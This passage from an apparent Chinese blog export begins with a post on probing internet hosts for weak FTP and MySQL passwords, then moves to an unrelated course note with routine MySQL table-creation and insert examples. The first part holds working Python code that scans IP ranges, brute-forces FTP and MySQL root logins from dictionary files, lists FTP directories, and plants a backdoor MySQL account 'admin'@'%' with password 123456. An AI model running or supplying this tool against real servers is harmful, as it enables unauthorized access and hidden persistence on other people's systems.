QtWidgets.QTextBrowser(Form)<br>            self.textBrowser.setGeometry(QtCore.QRect(40, 140, 256, 192))<br>            self.textBrowser.setObjectName(“textBrowser”)</p>\n<pre><code>        self.retranslateUi(Form)\n        QtCore.QMetaObject.connectSlotsByName(Form)\n\n    def retranslateUi(self, Form):\n        _translate = QtCore.QCoreApplication.translate\n        Form.setWindowTitle(_translate(&quot;Form&quot;, &quot;Form&quot;))\n        self.ftp_label.setText(_translate(&quot;Form&quot;, &quot;FTP server&quot;))\n        self.mysql_label.setText(_translate(&quot;Form&quot;, &quot;MySQL server&quot;))\n        self.ftp_scan.setText(_translate(&quot;Form&quot;, &quot;开始扫描&quot;))\n        self.mysql_scan.setText(_translate(&quot;Form&quot;, &quot;开始扫描&quot;))\n        self.textBrowser.setHtml(_translate(&quot;Form&quot;, &quot;&lt;!DOCTYPE HTML PUBLIC \\&quot;-//W3C//DTD HTML 4.0//EN\\&quot; \\&quot;http://www.w3.org/TR/REC-html40/strict.dtd\\&quot;&gt;\\n&quot;\n&quot;&lt;html&gt;&lt;head&gt;&lt;meta name=\\&quot;qrichtext\\&quot; content=\\&quot;1\\&quot; /&gt;&lt;style type=\\&quot;text/css\\&quot;&gt;\\n&quot;\n&quot;p, li { white-space: pre-wrap; }\\n&quot;\n&quot;&lt;/style&gt;&lt;/head&gt;&lt;body style=\\&quot; font-family:\\&apos;SimSun\\&apos;; font-size:9pt; font-weight:400; font-style:normal;\\&quot;&gt;\\n&quot;\n&quot;&lt;p style=\\&quot; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\\&quot;&gt;&lt;span style=\\&quot; font-family:\\&apos;SimSun\\&apos;;\\&quot;&gt;扫描结果如下：&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;))</code></pre><p>然后我们只需写一个调用这个组件的代码就行：</p>\n<p><strong>call_scan1.py</strong></p>\n<pre><code>import sys\nimport time\nfrom PyQt5.QtWidgets import QApplication, QMainWindow\nfrom PyQt5.QtCore import QObject, pyqtSignal\n\nfrom sample_scan_1 import Ui_Form\nfrom FtpModule import Ftp\nfrom MySQLModule import MySQL</code></pre><p>​<br>    class MainWindow(QMainWindow, Ui_Form):<br>        def <strong>init</strong>(self, parent=None):<br>            super(MainWindow, self).<strong>init</strong>(parent)<br>            self.setupUi(self)<br>            self.ftp_scan.clicked.connect(lambda: self.ftp())<br>            self.mysql_scan.clicked.connect(lambda: self.mysql())<br>            self.update_text()</p>\n<pre><code>    def ftp(self):\n        ftp = Ftp()\n        ftp.threadpool()\n\n    def mysql(self):\n        mysql = MySQL()\n        mysql.threadpool()\n\n    def update_text(self):\n\n        with open(&quot;./result.txt&quot;) as f:\n            line = f.readlines()\n            self.textBrowser.append(line[-1])\n\nif __name__ == &quot;__main__&quot;:\n    # 固定的，PyQt5程序都需要QApplication对象。sys.argv是命令行参数列表，确保程序可以双击运行\n    app = QApplication(sys.argv)\n    # 初始化\n    myWin = MainWindow()\n    # 将窗口控件显示在屏幕上\n    myWin.show()\n    # 程序运行，sys.exit方法确保程序完整退出。\n    sys.exit(app.exec_())</code></pre><h2 id=\"模块化\"><a href=\"#模块化\" class=\"headerlink\" title=\"模块化\"></a>模块化</h2><p>为了更好的与 PyQt5 配合，将代码各个功能规划到不同的类，根据需求调用</p>\n<p><strong>FtpModule.py</strong></p>\n<pre><code>import time\nimport socket\nfrom ftplib import FTP\nfrom datetime import datetime\nfrom multiprocessing.dummy import Pool as ThreadPool</code></pre><p>​<br>    class Ftp(object):</p>\n<pre><code>def __init__(self):\n    self.save_path = &quot;./result.txt&quot;\n    self.ip_list = []\n\ndef port_scan(self, ip):\n    t1 = datetime.now()\n    print(&quot;[+] Testing ports of : &quot; + str(ip) + &quot;\\n&quot;)\n    # scan_port(line.strip())\n    # 测试ftp端口是否开放\n    sk1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sk1.settimeout(1)\n    url2 = ip\n    # try_login_ftp(url2, save_path)\n    try:\n        res1 = sk1.connect_ex((ip, 21))\n        # print(res1)\n        if res1 == 0:\n            print(&quot;\\n[+] &quot; + str(url2) + &quot;\\&apos;s ftp service is ok! try to login...\\r\\n&quot;)\n            self.try_login_ftp(url2)\n\n    except Exception as e:\n        print(&quot;\\n[+] &quot; + str(url2) + &quot;\\&apos;s ftp service login failed!&quot; + e + &quot;\\r\\n&quot;)\n    sk1.close()\n    print(datetime.now() - t1)\n    return\n\ndef try_login_ftp(self, ip):\n    # 如果输出 user 和 pwd 为空则说明该 ftp 服务允许匿名访问\n    try:\n        ftp = FTP()\n        ftp.connect(ip)\n        with open(&quot;ftp_dict.txt&quot;, &apos;r&apos;) as f:\n            for line in f.readlines():\n                # print line.strip()\n                user = line.strip().split(&quot;|&quot;)[0]\n                pwd = line.strip().split(&quot;|&quot;)[1]\n                ftp.login(user, pwd)  # 匿名访问\n                # 访问成功\n                print(\n                    &quot;[+] &quot; + str(ip) + &quot;s FTP service login successful！username= &quot; +\n                    user + &quot;pwd = &quot; + pwd + &quot;\\r\\n&quot;)\n                # 将结果写入文件 result.txt\n                avleable_list = &quot;\\rftp service -- &quot; + str(time.asctime()) + &quot; ip: &quot; + \\\n                                str(ip) + &quot; username | pwd : &quot; + str(user) + &quot; | &quot; + str(pwd)\n                self.save_result(self.save_path, avleable_list)\n                # 尝试读取目录\n                print(&quot;\\n[+] &quot; + str(ip) + &quot;s ftp 文件目录为：&quot;)\n                ftp.dir()\n                break\n    except Exception as e:\n        print(e)\n        print(&quot;\\n[+] &quot; + str(self.ip) + &quot;s ftp service is bad!\\r\\n&quot;)\n        pass\n    return\n\ndef save_result(self, save_path, result_list):\n    s = open(self.save_path, &quot;a&quot;)\n    s.write(result_list)\n    s.close()\n    return\n\ndef threadpool(self):\n    with open(&apos;iprange.txt&apos;, &apos;rb&apos;) as f:\n        for line in f.readlines():\n            self.ip_list.append(line.strip())\n    print(self.ip_list)\n    t1 = datetime.now()\n    # 线程数为20\n    pool = ThreadPool(processes=20)\n    try:\n        pool.map(self.port_scan, self.ip_list)\n    except Exception as e:\n        print(e)\n    pool.close()\n    pool.join()\n\n    print(&apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1)\n    # port_scan(save_path=&quot;./result.txt&quot;)\n    return</code></pre><p><strong>MySQLModule.py</strong></p>\n<pre><code>import pymysql\nimport socket\nimport time\nfrom datetime import datetime\nfrom multiprocessing.dummy import Pool as ThreadPool\n\nclass MySQL(object):\n\n    def __init__(self):\n        self.save_path = &quot;./result.txt&quot;\n        self.ip_list = []\n\n    def port_scan(self, ip):\n        t1 = datetime.now()\n        print(&quot;[+] Testing ports of : &quot; + str(ip) + &quot;\\n&quot;)\n        # scan_port(line.strip())\n        url1 = ip\n        # 测试mysql端口是否开放\n        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sk.settimeout(1)\n        try:\n            res = sk.connect_ex((ip, 3306))\n            if res == 0:\n                print(&quot;\\n[+] &quot; + str(url1) + &quot;\\&apos;s Mysql is ok! try to login...\\r\\n&quot;)\n                self.try_login_sqlserver(url1)\n\n        except Exception as e:\n            print(&quot;\\n[-] &quot; + str(url1) + &quot;\\&apos;s Mysql is bad! &quot; + e + &quot;\\r\\n&quot;)\n        sk.close()\n        return\n\n    # 尝试登陆mysql服务\n    def try_login_sqlserver(self, ip):\n\n        with open(&apos;dict.txt&apos;, &apos;r&apos;) as f:\n            for line in f.readlines():\n                print(&quot;[+] Testing ip: &quot; + str(ip) + &quot; &amp; testing password：&quot; + line.strip())\n\n                # information_schema 是 Mysql 的默认数据库，我们有权限操作\n                # PyMysql.cursors.DictCursor 以字典方式进行连接参数管理\n                try:\n                    connection = pymysql.connect(host=ip,\n                                                 user=&apos;root&apos;,\n                                                 password=line.strip(),\n                                                 db=&apos;information_schema&apos;,\n                                                 charset=&apos;utf8mb4&apos;,\n                                                 cursorclass=pymysql.cursors.DictCursor)\n\n                    print(&quot;\\n[+] Testing ip: &quot; + str(ip) + &quot; Login successfully! try to set a backdoor account...\\r\\n&quot;)\n                    result_list = &quot;\\nsql service -- &quot; + str(time.asctime()) + &quot; ip: &quot; + str(ip) + &quot; pwd : &quot; + \\\n                                  str(line.strip())\n                    self.save_result(result_list)\n                    # 后门账号密码为 admin 123456\n                    self.try_set_backdoor(connection)\n                    connection.close()\n                except Exception as e:\n                    # print &quot;[-] &quot; + str(e.message)\n                    print(&quot;\\n[+] Testing ip: &quot; + str(ip) + &quot;  Using weakly password login failed!...&quot; + str(e) + &quot;\\r\\n&quot;)\n                pass\n        return\n\n    def try_set_backdoor(self, connection):\n        try:\n            with connection.cursor() as cursor:\n                # 创建一个新用户\n                sql = &quot;CREATE user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;&quot;\n                cursor.execute(sql)\n                # 将后门用户权限给到最大\n                cursor.execute(&quot;flush privileges;&quot;)\n                connection.commit()\n                connection.close()\n\n                print(&quot;[+] New account set successfully!\\r\\n&quot;)\n        except Exception as e:\n            # print e\n            print(&quot;[-] New account set failed! &quot; + str(e) + &apos;\\r\\n&apos;)\n        return\n\n    def save_result(self, result_list):\n        s = open(self.save_path, &quot;a&quot;)\n        s.write(result_list)\n        s.close()\n        return\n\n    def threadpool(self):\n        with open(&apos;iprange.txt&apos;, &apos;rb&apos;) as f:\n            for line in f.readlines():\n                self.ip_list.append(line.strip())\n        print(self.ip_list)\n        t1 = datetime.now()\n        # 线程数为20\n        pool = ThreadPool(processes=20)\n        try:\n            pool.map(self.port_scan, self.ip_list)\n        except Exception as e:\n            print(e)\n        pool.close()\n        pool.join()\n\n        print(&apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1)\n        # port_scan(save_path=&quot;./result.txt&quot;)\n        return</code></pre><h3 id=\"遇到问题\"><a href=\"#遇到问题\" class=\"headerlink\" title=\"遇到问题\"></a>遇到问题</h3><p>在网上找到弱口令账号之后，对方并没有开启远程登陆，也没法登陆成功！该怎么解决呢？明天再看看！12/16/2019 5:34:36 PM </p>\n<p>答：如果不开启远程登陆，就无法远程连接该数据库，视为未开放弱口令</p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/KevinGeorge/p/7858564.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/KevinGeorge/p/7858564.html</a></p>\n<p><a href=\"https://nmap.org/man/zh/man-host-discovery.html\" target=\"_blank\" rel=\"noopener\">https://nmap.org/man/zh/man-host-discovery.html</a></p>\n<p><a href=\"https://pypi.org/project/pcap-ct/\" target=\"_blank\" rel=\"noopener\">https://pypi.org/project/pcap-ct/</a></p>\n<p><a href=\"https://github.com/PyMySQL/PyMySQL/\">https://github.com/PyMySQL/PyMySQL/</a></p>\n<p><a href=\"https://blog.csdn.net/rebelqsp/article/details/22109925\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/rebelqsp/article/details/22109925</a></p>\n<p><a href=\"https://www.jb51.net/article/62238.htm\" target=\"_blank\" rel=\"noopener\">https://www.jb51.net/article/62238.htm</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_33805992/article/details/86435703\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/weixin_33805992/article/details/86435703</a></p>\n</blockquote>\n","text":"互联网sql、ftp服务弱口令探测12/11/2019 1:26:12 PM 设计思路给定网段，扫描存活主机(def get_ip)，将IP地址存放在 iprange.txt 中由于这一阶段的探测目标是指定服务，因此我们跳过端口扫描阶段，直接进行特定端口探测(def port_s","link":"","raw":null,"photos":[],"categories":[{"name":"tool","slug":"tool","count":1,"path":"api/categories/tool.json"}],"tags":[{"name":"MySql","slug":"MySql","count":2,"path":"api/tags/MySql.json"},{"name":"FTP","slug":"FTP","count":1,"path":"api/tags/FTP.json"},{"name":"scan","slug":"scan","count":1,"path":"api/tags/scan.json"}]},{"title":"数据库概论","slug":"数据库概论","date":"2020-04-29T05:40:34.000Z","updated":"2020-04-30T02:51:41.447Z","comments":true,"path":"api/articles/数据库概论.json","excerpt":"","keywords":null,"cover":"C:%5CUsers%5Cbrian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200317092800919.png","content":"<h1 id=\"数据库概论\"><a href=\"#数据库概论\" class=\"headerlink\" title=\"数据库概论\"></a>数据库概论</h1><h2 id=\"E-R图\"><a href=\"#E-R图\" class=\"headerlink\" title=\"E-R图\"></a>E-R图</h2><h2 id=\"增删改查\"><a href=\"#增删改查\" class=\"headerlink\" title=\"增删改查\"></a>增删改查</h2><h3 id=\"创建新表并插入数据\"><a href=\"#创建新表并插入数据\" class=\"headerlink\" title=\"创建新表并插入数据\"></a>创建新表并插入数据</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show tables;</span><br><span class=\"line\">+<span class=\"comment\">-----------------------+</span></span><br><span class=\"line\">| Tables_in_studentinfo |</span><br><span class=\"line\">+<span class=\"comment\">-----------------------+</span></span><br><span class=\"line\">| course                |</span><br><span class=\"line\">| sc                    |</span><br><span class=\"line\">| studente              |</span><br><span class=\"line\">+<span class=\"comment\">-----------------------+</span></span><br></pre></td></tr></table></figure>\n\n<p>将三个表全部删除然后新建新的表：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; drop table course;</span><br><span class=\"line\">mysql&gt; drop table sc;</span><br><span class=\"line\">mysql&gt; drop table studente;</span><br><span class=\"line\">mysql&gt; show tables;</span><br><span class=\"line\">Empty <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br></pre></td></tr></table></figure>\n\n<p>要创建的表的属性：</p>\n<p><img src=\"C:%5CUsers%5Cbrian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200317092800919.png\" alt=\"image-20200317092800919\"></p>\n<p><img src=\"C:%5CUsers%5Cbrian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200317092828418.png\" alt=\"image-20200317092828418\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; create table Student</span><br><span class=\"line\">    -&gt; (Sno char(12) PRIMARY KEY, //主键</span><br><span class=\"line\">    -&gt; Sname char(20) UNIQUE NOT NULL, //不为空且取值唯一</span><br><span class=\"line\">    -&gt; Ssex char(8) DEFAULT 'male', //默认值 male</span><br><span class=\"line\">    -&gt; Sage int(4),</span><br><span class=\"line\">    -&gt; Sdept char(15)</span><br><span class=\"line\">    -&gt; );</span><br><span class=\"line\">mysql&gt; desc student;</span><br><span class=\"line\">+<span class=\"comment\">-------+----------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Field | Type     | Null | Key | Default | Extra |</span><br><span class=\"line\">+<span class=\"comment\">-------+----------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Sno   | char(12) | NO   | PRI | NULL    |       |</span><br><span class=\"line\">| Sname | char(20) | NO   | UNI | NULL    |       |</span><br><span class=\"line\">| Ssex  | char(8)  | YES  |     | male    |       |</span><br><span class=\"line\">| Sage  | int(4)   | YES  |     | NULL    |       |</span><br><span class=\"line\">| Sdept | char(15) | YES  |     | NULL    |       |</span><br><span class=\"line\">+<span class=\"comment\">-------+----------+------+-----+---------+-------+</span></span><br><span class=\"line\">5 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.01</span> sec)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; create table Course</span><br><span class=\"line\">    -&gt; (Cno char(15) PRIMARY KEY,</span><br><span class=\"line\">    -&gt; Cname char(20) NOT NULL,</span><br><span class=\"line\">    -&gt; Cpno char(15),</span><br><span class=\"line\">    -&gt; Credits SMALLINT //小整型</span><br><span class=\"line\">    -&gt; );</span><br><span class=\"line\">Query OK, 0 rows affected (0.48 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; desc course;</span><br><span class=\"line\">+<span class=\"comment\">---------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Field   | Type        | Null | Key | Default | Extra |</span><br><span class=\"line\">+<span class=\"comment\">---------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Cno     | char(15)    | NO   | PRI | NULL    |       |</span><br><span class=\"line\">| Cname   | char(20)    | NO   |     | NULL    |       |</span><br><span class=\"line\">| Cpno    | char(15)    | YES  |     | NULL    |       |</span><br><span class=\"line\">| Credits | smallint(6) | YES  |     | NULL    |       |</span><br><span class=\"line\">+<span class=\"comment\">---------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">4 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.01</span> sec)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; CREATE TABLE SC(</span><br><span class=\"line\">    -&gt; Sno char(12),</span><br><span class=\"line\">    -&gt; Cno char(15),</span><br><span class=\"line\">    -&gt; Grade SMALLINT,</span><br><span class=\"line\">    -&gt; PRIMARY KEY(Sno,Cno) //以元组的形式创建多个主键</span><br><span class=\"line\">    -&gt; );</span><br><span class=\"line\">Query OK, 0 rows affected (0.14 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; desc sc;</span><br><span class=\"line\">+<span class=\"comment\">-------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Field | Type        | Null | Key | Default | Extra |</span><br><span class=\"line\">+<span class=\"comment\">-------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Sno   | char(12)    | NO   | PRI |         |       |</span><br><span class=\"line\">| Cno   | char(15)    | NO   | PRI |         |       |</span><br><span class=\"line\">| Grade | smallint(6) | YES  |     | NULL    |       |</span><br><span class=\"line\">+<span class=\"comment\">-------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">3 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.01</span> sec)</span><br></pre></td></tr></table></figure>\n\n<p>向各个表都插入数据</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; INSERT INTO student</span><br><span class=\"line\">    -&gt; (Sno,Sname,Ssex,Sage,Sdept)</span><br><span class=\"line\">    -&gt; VALUES</span><br><span class=\"line\">    -&gt; ('201708034210','LiYong','male',20,'CS');</span><br><span class=\"line\">Query OK, 1 row affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from student;</span><br><span class=\"line\">+<span class=\"comment\">--------------+--------+------+------+-------+</span></span><br><span class=\"line\">| Sno          | Sname  | Ssex | Sage | Sdept |</span><br><span class=\"line\">+<span class=\"comment\">--------------+--------+------+------+-------+</span></span><br><span class=\"line\">| 201708034210 | LiYong | male |   20 | CS    |</span><br><span class=\"line\">+<span class=\"comment\">--------------+--------+------+------+-------+</span></span><br><span class=\"line\">1 row in <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br></pre></td></tr></table></figure>\n\n<p>插入多行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; INSERT INTO student</span><br><span class=\"line\">    -&gt; (Sno,Sname,Ssex,Sage,Sdept)</span><br><span class=\"line\">    -&gt; VALUES</span><br><span class=\"line\">    -&gt; (&apos;201215122&apos;,&apos;LiuChen&apos;,&apos;female&apos;,19,&apos;CS&apos;),</span><br><span class=\"line\">    -&gt; (&apos;201215123&apos;,&apos;WangMin&apos;,&apos;female&apos;,18,&apos;CS&apos;),</span><br><span class=\"line\">    -&gt; (&apos;201215125&apos;,&apos;ZhangLi&apos;,&apos;&apos;,19,&apos;IS&apos;);</span><br><span class=\"line\">mysql&gt; select * from student;</span><br><span class=\"line\">+--------------+---------+--------+------+-------+</span><br><span class=\"line\">| Sno          | Sname   | Ssex   | Sage | Sdept |</span><br><span class=\"line\">+--------------+---------+--------+------+-------+</span><br><span class=\"line\">| 201708034210 | LiYong  | male   |   20 | CS    |</span><br><span class=\"line\">| 201215122    | LiuChen | female |   19 | CS    |</span><br><span class=\"line\">| 201215123    | WangMin | female |   18 | CS    |</span><br><span class=\"line\">| 201215125    | ZhangLi |        |   19 | IS    |</span><br><span class=\"line\">+--------------+---------+--------+------+-------+</span><br><span class=\"line\">4 rows in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; INSERT INTO COURSE</span><br><span class=\"line\">    -&gt; (Cno,Cname,Cpno,Credits)</span><br><span class=\"line\">    -&gt; VALUES</span><br><span class=\"line\">    -&gt; (&apos;2&apos;,&apos;math&apos;,&apos;&apos;,2),</span><br><span class=\"line\">    -&gt; (&apos;3&apos;,&apos;infosystem&apos;,&apos;1&apos;,4),</span><br><span class=\"line\">    -&gt; (&apos;4&apos;,&apos;os&apos;,&apos;6&apos;,3),</span><br><span class=\"line\">    -&gt; (&apos;5&apos;,&apos;datestructure&apos;,&apos;7&apos;,4),</span><br><span class=\"line\">    -&gt; (&apos;6&apos;,&apos;dateprocessing&apos;,&apos;&apos;,2),</span><br><span class=\"line\">    -&gt; (&apos;7&apos;,&apos;python&apos;,&apos;6&apos;,4);</span><br><span class=\"line\">mysql&gt; select * from course;</span><br><span class=\"line\">+-----+----------------+------+---------+</span><br><span class=\"line\">| Cno | Cname          | Cpno | Credits |</span><br><span class=\"line\">+-----+----------------+------+---------+</span><br><span class=\"line\">| 1   | database       | 5    |       4 |</span><br><span class=\"line\">| 2   | math           |      |       2 |</span><br><span class=\"line\">| 3   | infosystem     | 1    |       4 |</span><br><span class=\"line\">| 4   | os             | 6    |       3 |</span><br><span class=\"line\">| 5   | datestructure  | 7    |       4 |</span><br><span class=\"line\">| 6   | dateprocessing |      |       2 |</span><br><span class=\"line\">| 7   | python         | 6    |       4 |</span><br><span class=\"line\">+-----+----------------+------+---------+</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; INSERT INTO sc</span><br><span class=\"line\">    -&gt; (Sno,Cno,Grade)</span><br><span class=\"line\">    -&gt; VALUES</span><br><span class=\"line\">    -&gt; (&apos;201215121&apos;,&apos;1&apos;,92),</span><br><span class=\"line\">    -&gt; (&apos;201215121&apos;,&apos;3&apos;,85),</span><br><span class=\"line\">    -&gt; (&apos;201215121&apos;,&apos;2&apos;,88),</span><br><span class=\"line\">    -&gt; (&apos;201215122&apos;,&apos;2&apos;,90),</span><br><span class=\"line\">    -&gt; (&apos;201215122&apos;,&apos;3&apos;,80);</span><br><span class=\"line\">Query OK, 5 rows affected (0.00 sec)</span><br><span class=\"line\">Records: 5  Duplicates: 0  Warnings: 0</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; SELECT * FROM SC;</span><br><span class=\"line\">+-----------+-----+-------+</span><br><span class=\"line\">| Sno       | Cno | Grade |</span><br><span class=\"line\">+-----------+-----+-------+</span><br><span class=\"line\">| 201215121 | 1   |    92 |</span><br><span class=\"line\">| 201215121 | 3   |    85 |</span><br><span class=\"line\">| 201215121 | 2   |    88 |</span><br><span class=\"line\">| 201215122 | 2   |    90 |</span><br><span class=\"line\">| 201215122 | 3   |    80 |</span><br><span class=\"line\">+-----------+-----+-------+</span><br></pre></td></tr></table></figure>\n\n<p>第四条插入时想使用默认值，于是插入了空，但是却没设置为默认值，更新一下这条数据</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> table_name <span class=\"keyword\">SET</span> field1=<span class=\"keyword\">new</span>-value1, field2=<span class=\"keyword\">new</span>-value2</span><br><span class=\"line\">[<span class=\"keyword\">WHERE</span> Clause]</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; <span class=\"keyword\">UPDATE</span> student <span class=\"keyword\">SET</span> Ssex=<span class=\"string\">'male'</span> <span class=\"keyword\">WHERE</span> Sno=<span class=\"string\">'201215125'</span>;</span><br><span class=\"line\">Query OK, 1 row affected (0.00 sec)</span><br><span class=\"line\">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from student;</span><br><span class=\"line\">+<span class=\"comment\">--------------+---------+--------+------+-------+</span></span><br><span class=\"line\">| Sno          | Sname   | Ssex   | Sage | Sdept |</span><br><span class=\"line\">+<span class=\"comment\">--------------+---------+--------+------+-------+</span></span><br><span class=\"line\">| 201708034210 | LiYong  | male   |   20 | CS    |</span><br><span class=\"line\">| 201215122    | LiuChen | female |   19 | CS    |</span><br><span class=\"line\">| 201215123    | WangMin | female |   18 | CS    |</span><br><span class=\"line\">| 201215125    | ZhangLi | male   |   19 | IS    |</span><br><span class=\"line\">+<span class=\"comment\">--------------+---------+--------+------+-------+</span></span><br><span class=\"line\">4 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br></pre></td></tr></table></figure>\n\n<p>正确使用默认值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 